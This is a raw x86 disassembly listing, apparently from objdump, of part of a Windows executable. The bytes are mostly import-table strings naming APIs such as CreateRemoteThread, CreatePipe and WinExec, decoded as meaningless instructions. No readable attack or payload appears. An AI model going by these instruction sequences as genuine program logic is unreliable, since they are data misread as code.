  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
